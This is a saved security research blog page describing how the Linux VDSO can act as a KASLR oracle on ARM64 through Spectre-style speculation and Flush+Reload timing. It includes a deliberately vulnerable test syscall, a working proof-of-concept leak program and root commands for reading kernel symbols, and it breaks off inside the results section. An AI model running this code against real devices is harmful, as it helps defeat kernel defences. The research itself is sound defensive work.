<!DOCTYPE html>
<!-- saved from url=(0045)https://www.longterm.io/vdso_sidechannel.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0">

		<title>Longterm Security</title>

		<!-- CSS  -->
		<link href="./2021 - VDSO As A Potential KASLR Oracle_files/materialize.css" type="text/css" rel="stylesheet" media="screen,projection">
		<link href="./2021 - VDSO As A Potential KASLR Oracle_files/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css">
		<link href="./2021 - VDSO As A Potential KASLR Oracle_files/style.css" type="text/css" rel="stylesheet" media="screen,projection">
		<link rel="stylesheet" href="./2021 - VDSO As A Potential KASLR Oracle_files/codehilite.css">
	</head>
	<body>
		<nav class="grey darken-4" role="navigation">
			<div class="nav-wrapper container">
				<a id="logo-container" href="https://www.longterm.io/vdso_sidechannel.html#" class="brand-logo">Longterm Security</a>
				<ul class="right hide-on-med-and-down quiet_list">
					<li><a href="https://www.longterm.io/vdso_sidechannel.html#services">Services</a></li>
					<li><a href="https://www.longterm.io/vdso_sidechannel.html#resources">Blog</a></li>
					<li><a href="https://medium.com/@longtermsec/" target="_blank">
						<i class="mdi mdi-medium"></i>
					</a></li>
					<li><a href="https://twitter.com/longtermsec" target="_blank">
						<i class="mdi mdi-twitter"></i>
					</a></li>
				</ul>

				<ul id="nav-mobile" class="side-nav quiet_list" style="transform: translateX(-100%);">
					<li><a href="https://www.longterm.io/vdso_sidechannel.html#services">Services</a></li>
					<li><a href="https://www.longterm.io/vdso_sidechannel.html#resources">Blog</a></li>
					<li><a href="https://medium.com/@longtermsec/" target="_blank">
						<!--i class="mdi mdi-medium"></i-->Blog
					</a></li>
					<li><a href="https://twitter.com/longtermsec" target="_blank">
						<!--i class="mdi mdi-twitter"></i-->Twitter
					</a></li>
				</ul>
				<a href="https://www.longterm.io/vdso_sidechannel.html#" data-activates="nav-mobile" class="button-collapse"><i class="mdi mdi-menu"></i></a>
			</div>
		</nav>



	<div id="index-resources">
		<div class="container">
			<div class="section">

				<a name="resources"></a>


				<div class="row">
					<div class="col s14 m12">
						<div class="card">
								<div class="card-content">
<div>
<h1 id="vdso-as-a-potential-kaslr-oracle">VDSO As A Potential KASLR Oracle</h1>
<h5 class="grey-text">Post by Philip Pettersson and Alex Radocea</h5>
<h2 id="introduction">Introduction</h2>
<p>The VDSO region can serve as a potential oracle to bypass KASLR with speculative sidechannels. This post covers what the VDSO region is, KASLR, and an example gadget to exploit the sidechannel. We show some experimental timing results and a suggested fix.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#Introduction">Introduction</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#what-is-VDSO">What is VDSO</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#Linux-KASLR">Linux KASLR</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#speculative-sidechannels">Speculative Sidechannels on ARM64</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#cache-timing-primitives">Cache Timing Primitives</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#example-vulnerable-syscall">Example Vulnerable Syscall</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#attack-implementation">Attack Implementation</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#results">Results</a></li>
<li><a href="https://www.longterm.io/vdso_sidechannel.html#suggested-fix">Suggested Fix</a></li>
</ul>
<h2 id="what-is-vdso">What is VDSO</h2>
<p>The "VDSO" ("virtual dynamic shared object") is a special region of the kernel that is mapped into all userland processes. The userland virtual address of the VDSO region will differ in each process, but they all point to the same physical page of memory.</p>
<p>This region was created to address the problem of syscall overhead. While this overhead has been improved in recent decades from the traditional "int 0x80" on 32-bit x86, there is still invariably an overhead cost associated with calling a system call on any Linux platform.</p>
<p>This overhead can become a problem for small system calls that get called repeatedly in tight loops. If the kernel code of the system call is very short, the overhead will naturally be a larger share of total execution time. This includes system calls that only return a simple kernel data value.</p>
<p>To solve this issue, the VDSO contains special vdso-versions of system calls which fit these criteria. As of writing, these system calls are all related to timing measurements (arm64/x86):</p>
<div class="codehilite"><pre><span></span><code><span class="err">clock_gettime()</span>
<span class="err">gettimeofday()</span>
<span class="err">clock_getres()</span>
<span class="err">time()</span>
</code></pre></div>

<p>Since these are all simple data-fetcher type functions that are commonly used in loops, the Linux kernel defines vdso-versions of these system calls which do not traverse the user-kernel boundary. They accomplish this by mapping a vdso code page into each userland process, as well as a vdso data page called <code>vvar</code>. These pages are all copy-on-write mappings that point to the global kernel pages.</p>
<p>When a userland program wants to call <code>clock_gettime()</code> for example, libc will know that a vdso version of the system call exists and will jump to it in the special vdso code page. This function will then simply inspect the vdso data page for the correct value and return it, just like the kernel code would - but without crossing the kernel boundary and incurring the overhead.</p>
<p>On ARM64 the code page is called <code>vdso</code> and points to the kernel page <code>vdso_start</code> which is located in the kernel TEXT region. The data page is called <code>vvar</code> and points to the kernel page <code>vdso_data</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="n">arch</span><span class="o">/</span><span class="n">arm64</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">vdso</span><span class="p">.</span><span class="n">c</span>

    <span class="cm">/* Populate the special mapping structures */</span>
    <span class="n">mappings</span><span class="o">-&gt;</span><span class="n">data_mapping</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">vm_special_mapping</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">name</span>   <span class="o">=</span> <span class="s">"[vvar]"</span><span class="p">,</span>
        <span class="p">.</span><span class="n">pages</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">vdso_pagelist</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
    <span class="p">};</span>

    <span class="n">mappings</span><span class="o">-&gt;</span><span class="n">code_mapping</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">vm_special_mapping</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">name</span>   <span class="o">=</span> <span class="s">"[vdso]"</span><span class="p">,</span>
        <span class="p">.</span><span class="n">pages</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">vdso_pagelist</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
    <span class="p">};</span>
</code></pre></div>

<h2 id="linux-kaslr">Linux KASLR</h2>
<p>KASLR ("Kernel Address Space Layout Randomization") is a Linux security feature that ensures that the kernel is located at different addresses on each boot. This helps complicate the exploitation of many types of memory corruption vulnerabilities  since an attacker can't immediately know the location of data structures they want to change, or functions they want to call. Linux on ARM64 has had KASLR support since version 4.6.</p>
<p>It implements the functionality by randomizing the virtual address start of the kernel TEXT and module regions. Some kernels additionally place the physical memory location of the kernel at a random starting address.</p>
<p>If an attacker can leak the virtual address of a kernel function at runtime, the secret randomization value that was used at boot can easily be deduced given a copy of the kernel image.</p>
<p>As an example, let's examine the runtime address of <code>vdso_start</code> on a Pixel 3 running Android 10:</p>
<div class="codehilite"><pre><span></span><code>sargo:/ <span class="c1"># echo 0 &gt; /proc/sys/kernel/kptr_restrict</span>
sargo:/ <span class="c1"># grep vdso_start /proc/kallsyms</span>
ffffff8a83a01000 R vdso_start
</code></pre></div>

<p>We can compare this with the raw offset for <code>vdso_start</code>, which we can extract from the <a href="https://developers.google.com/android/images">firmware image</a> using gdb:</p>
<div class="codehilite"><pre><span></span><code>% ~/android-ndk-r21b/prebuilt/darwin-x86_64/bin/gdb ./vmlinux
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> <span class="m">8</span>.3
...
<span class="o">(</span>gdb<span class="o">)</span> p vdso_start
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xffffff8009c01000 &lt;vdso_start&gt;
<span class="o">(</span>gdb<span class="o">)</span> p _text
<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xffffff8008080000 &lt;_text&gt;
</code></pre></div>

<p>The offset of <code>vdso_start</code> in the kernel TEXT is <code>0x1b81000</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="err">&gt;&gt;&gt; hex(0xffffff8009c01000 - 0xffffff8008080000)</span>
<span class="err">'0x1b81000L'</span>
</code></pre></div>

<p>Now we can calculate the randomized start of the runtime kernel, by simply subtracting the known offset from the runtime virtual address of <code>vdso_start</code>.</p>
<div class="codehilite"><pre><span></span><code>&gt;&gt;&gt; hex<span class="o">(</span>0xffffff8a83a01000 - 0x1b81000<span class="o">)</span>
<span class="s1">'0xffffff8a81e80000L'</span>

sargo:/ <span class="c1"># grep 'T _text' /proc/kallsyms</span>
ffffff8a81e80000 T _text
</code></pre></div>

<p>Therefore, if we can leak the virtual address of <code>vdso_start</code> we can bypass KASLR.</p>
<h2 id="speculative-sidechannels">Speculative Sidechannels</h2>
<p>In 2016 Lipp, et al. published <a href="https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_lipp.pdf">ARMageddon</a>. This paper covers ARM cache sidechannel attacks in detail and covers techniques such as Prime+Probe, Flush+Reload, and Evict+Reload on ARM. In January 2018, <a href="https://spectreattack.com/spectre.pdf">Spectre</a> and <a href="https://meltdownattack.com/meltdown.pdf">Meltdown</a> were announced. These papers demonstrate how to exploit speculative execution, sometimes in concert with cache timing sidechannels, to disclose memory contents across privilege boundaries or leak the address space layout.</p>
<p>Speculative execution is a performance technique which concurrently executes future instructions, whether or not they may actually execute. If they do actually execute, then the results are good to keep. If they don't however, then the instructions are retired and any memory/register side effects are reverted and ignored.</p>
<p>In terms of security, any side effects that are not reverted can lead to bypasses: for example the disclosure of privileged memory from an unprivileged process. Some side effects, like cache memory updates, were a substantial surprise to the public security industry, though not CPU designers, when Spectre came out. The cache sidechannels can potentially be mitigated with speculative memory barriers that prevent out-of-order execution. Other side effects, like differences in timing due to microarchitectural implementation flaws, can not be avoided or reverted without firmware or cpu fixes though.</p>
<p>As a result of meltdown, the linux kernel has implemented <a href="https://www.kernel.org/doc/html/latest/x86/pti.html">KPTI</a>.  To defend against Spectre on ARM, several <a href="https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability/downloads/cache-speculation-side-channels-linux-kernel-mitigations">kernel mitigations</a> are in place. The variant groups have the following key mitigations:</p>
<ul>
<li>
<p>Variant 1 -- data speculation barriers have been implemented across critical user-kernel boundaries.</p>
</li>
<li>
<p>Variant 2 -- instruction cache invalidation is performed around context switches and additional firmware-level mitgations to harden branch predictors have been created</p>
</li>
<li>
<p>Variant 3 - KPTI for meltdown</p>
</li>
<li>
<p>Variant 4 SSBS/SSBD mitigations in firmware to disable out of order memory loads and stores at boot time or per process.  </p>
</li>
</ul>
<p>Several projects have implemented proof of concepts for these vulnerabilities. Some of the best are <a href="https://github.com/google/safeside">Safeside</a> and IAIK's <a href="https://github.com/IAIK/transientfail/tree/master/pocs">transientfail</a>. The <a href="https://transient.fail/">transient.fail website</a> delivers an excellent dichomoty of the main known speculative variants.</p>
<p>A particularly simple Spectre variant abuses the Pattern History Table which optimizes loops. For example, given a nested loop with a conditional which dereferences memory, the PHT logic would not be able to inform speculative execution to stop early. This can lead to speculative out of bounds array access, which has cache side effects.</p>
<h4 id="pht-speculative-execution-example">PHT Speculative Execution Example</h4>
<div class="codehilite"><pre><span></span><code>    <span class="kt">void</span> <span class="o">*</span><span class="n">vdso</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">getauxval</span><span class="p">(</span><span class="n">AT_SYSINFO_EHDR</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">parray</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="s">"data string"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="o">*</span><span class="n">Memory</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">parray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parray</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">parray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">vdso</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">Memory</span> <span class="o">=</span> <span class="n">N</span><span class="p">;</span>

    <span class="n">flush_t</span><span class="p">(</span><span class="n">vdso</span><span class="p">);</span> <span class="c1">//clear out vdso from the cache</span>

    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>


    <span class="c1">// SPEC EXEC CODE STARTS HERE</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">outer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="n">outer</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">inner</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">inner</span> <span class="o">&lt;</span> <span class="o">*</span><span class="n">Memory</span><span class="p">;</span> <span class="n">inner</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

                <span class="c1">//a speculative memory barrier would block this attack</span>
                <span class="c1">//mbarrier() ;</span>


                <span class="c1">//speculative execution from the PHT dereferences inner +1, inner+2, etc</span>
                <span class="n">x</span> <span class="o">=</span> <span class="n">parray</span><span class="p">[</span><span class="n">inner</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>

                <span class="c1">//time access to vdso then invalidate it from cache</span>
                <span class="n">delta</span> <span class="o">=</span> <span class="n">flush_reload_t</span><span class="p">(</span><span class="n">vdso</span><span class="p">);</span>

                        <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">&lt;</span> <span class="n">CACHE_MISS_THRESHOLD</span><span class="o">*</span><span class="mf">0.7</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"hit: %zd</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">delta</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="c1">//use x to avoid being optimized out by the compiler</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mh">0xfe</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"this is unexpected</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>

<p>Surprisingly, the vdso pointer ends up being read and stored in cache due to speculative execution going out of bounds. Measuring the cache using flush+reload demonstrates it readily across linux ARM devices.</p>
<h2 id="cache-timing-primitives">Cache Timing Primitives</h2>
<p>The ARM cache architecture is implementor dependent and has several key differences than say intel. This <a href="http://events17.linuxfoundation.org/sites/events/files/slides/slides_17.pdf">slidedeck</a> has some good pointers. The following list is helpful to understand how ARM may be different than other cpus</p>
<ul>
<li>A split instruction and data cache at L1</li>
<li>An instruction cache which is typically virtually indexed at L1, but a data cache that is physically indexed from L1 and above</li>
<li>Subsequently a point of unification for the split caches at L2 or L3</li>
<li>Shareability attributes dictating whether coherencey happens across cores or which subset of cores.</li>
<li>"Clean" writes dirty data back, meaning pushes data out towards the point of coherency.</li>
<li>A clean typically happens upon eviction but can also happen directly with cpu instructions, some of which are unprivileged on ARMv8. This was not possible on ARMv7</li>
<li>"Invalidate" empties lines of cache</li>
<li>Attributes exist for how write backs happen</li>
</ul>
<p>Very critically to this article, data memory reads from two distinct virtual addresses which reference the same exact physical address would be handled at the same cache lines at each level of physically indexed cache. And for performance, physically indexed caches are not flushed across a context switch from EL0 to EL1 or EL1 to EL0.</p>
<p>This leads to a key attack primitive. Across exception levels, a lower exception level can measure cache access to determine if a higher exception level accessed the same physical memory.</p>
<p>In the case of the VDSO, we have pages of memory with a <strong>.text</strong> kernel virtual address, which get mapped into userland processes. Using Flush+Reload it is possible to measure a kernel system call (or other process) accessing VDSO memory as follows:</p>
<ol>
<li>At EL0 run instructions to clean/invalidate a data cache line in the VDSO with the userland address</li>
<li>Context switch into EL1 and Run a system call which  accesses VDSO memory via the kernel virtual address</li>
<li>Context switch back into EL0  when the system call returns</li>
<li>Time the memory access to VDSO memory via the userland address.</li>
</ol>
<p>Combining  this concept with Spectre -- if a system call might speculatively access virtual memory addresses injected by userland, then it becomes possible to create a KASLR oracle. Userland abuses the vulnerable system call with various KASLR guesses and then measure the results.</p>
<h2 id="example-vulnerable-syscall">Example Vulnerable Syscall</h2>
<p>Real world gadgets depend on the emitted instructions maintaining the memory dereference in the inner loop, which is critical for mistraining the Pattern History Table optimization into executing array indexing out of bounds.  Additionally, a real world gadget requires control of which pointer will be dereferenced, for example by controlling pointers on a heap chunk boundary.</p>
<p>To demonstrate this attack across the boundary consider the following test system call. For simplicity, this routine is compiled without any optimization.</p>
<div class="codehilite"><pre><span></span><code><span class="n">__attribute__</span><span class="p">((</span><span class="n">optnone</span><span class="p">))</span>
<span class="n">asmlinkage</span> <span class="kt">long</span> <span class="n">sys_spectre_test</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">inBuf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">inLen</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">outerLen</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__user</span> <span class="o">*</span><span class="n">ret_p</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">spectre_data</span> <span class="n">data</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">inLen</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="n">__user</span><span class="p">)</span><span class="n">inBuf</span><span class="p">,</span> <span class="n">inLen</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data</span><span class="p">.</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">data</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">;</span>
        <span class="p">}</span>

          <span class="c1">//every value past data.len is initialized by userland</span>
        <span class="c1">//Speculative execution due to PHT misprediction will see inner&gt;=data.len being dereferenced and stored in cache.</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">outerLen</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data</span><span class="p">.</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>

        <span class="o">*</span><span class="n">ret_p</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<h2 id="attack-implementation">Attack Implementation</h2>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/auxv.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp"></span>

<span class="c1">//From https://github.com/IAIK/transientfail/tree/master/pocs/libcache</span>
<span class="cp">#include</span> <span class="cpf">"../../../libcache/cacheutils.h"</span><span class="cp"></span>

<span class="k">struct</span> <span class="nc">spectre_struct</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
    <span class="kt">void</span><span class="o">*</span> <span class="n">values</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">spectre_struct</span> <span class="n">data</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">vdso</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">getauxval</span><span class="p">(</span><span class="n">AT_SYSINFO_EHDR</span><span class="p">);</span>
    <span class="n">pagesize</span> <span class="o">=</span> <span class="n">sysconf</span><span class="p">(</span><span class="n">_SC_PAGESIZE</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">CACHE_MISS</span><span class="p">)</span>
        <span class="n">CACHE_MISS</span> <span class="o">=</span> <span class="n">detect_flush_reload_threshold</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Flush+Reload Threshold: %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">CACHE_MISS</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">delta</span><span class="p">,</span> <span class="n">mini</span> <span class="o">=</span> <span class="mi">20000</span><span class="p">;</span>

    <span class="c1">//from testing -- vdso + 4096 + 1024 does not collide with data access when a new process is created</span>
    <span class="c1">//so it avoids false positives</span>

    <span class="kt">int</span> <span class="n">roll_offset</span> <span class="o">=</span> <span class="mi">4096</span> <span class="o">+</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">vdso_target</span> <span class="o">=</span>  <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">vdso</span> <span class="o">+</span> <span class="n">roll_offset</span><span class="p">;</span>

    <span class="n">data</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">values</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="c1">//NOTE -- update with the real vdso_start, or the guess</span>
        <span class="n">data</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">strtoull</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">roll_offset</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">flush</span><span class="p">(</span><span class="n">vdso_target</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
        <span class="n">j</span><span class="o">++</span><span class="p">;</span>

        <span class="c1">//jump into kernel for spec exec</span>
        <span class="n">syscall</span><span class="p">(</span><span class="mi">297</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">8192</span><span class="p">);</span>

        <span class="n">delta</span> <span class="o">=</span> <span class="n">flush_reload_t</span><span class="p">(</span><span class="n">vdso_target</span><span class="p">);</span>

         <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">&lt;</span> <span class="n">mini</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">mini</span> <span class="o">=</span>  <span class="n">delta</span><span class="p">;</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%zd %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mini</span><span class="p">,</span> <span class="n">mini</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">CACHE_MISS</span><span class="o">*</span><span class="mf">0.8</span><span class="p">)</span> <span class="o">?</span> <span class="s">"*"</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span> <span class="n">mini</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">CACHE_MISS</span><span class="o">*</span><span class="mf">0.8</span><span class="p">)</span> <span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
         <span class="p">}</span>

    <span class="p">}</span>

    <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h2 id="results">Results</h2>
<p>Tests were run on a pixel 3a. This features a Snapdragon 670.</p>
<div class="codehilite"><pre><span></span><code><span class="m">1</span><span class="p">|</span>sargo:/ $ cat /proc/cpuinfo
Processor   : AArch64 Processor rev <span class="m">12</span> <span class="o">(</span>aarch64<span class="o">)</span>
processor   : <span class="m">0</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x7
CPU part    : 0x803
CPU revision    : <span class="m">12</span>

processor   : <span class="m">1</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x7
CPU part    : 0x803
CPU revision    : <span class="m">12</span>

processor   : <span class="m">2</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x7
CPU part    : 0x803
CPU revision    : <span class="m">12</span>

processor   : <span class="m">3</span>
BogoMIPS    : <span class="m">38</span>.00
Features    : fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp
CPU implementer : 0x51
CPU architecture: <span class="m">8</span>
CPU variant : 0x7
CPU part    : 0x803
CPU revision    : <span class="m">12</span>

processor   : <span class="m">4</span>
BogoMIPS    : <span class="m">38</span>.00
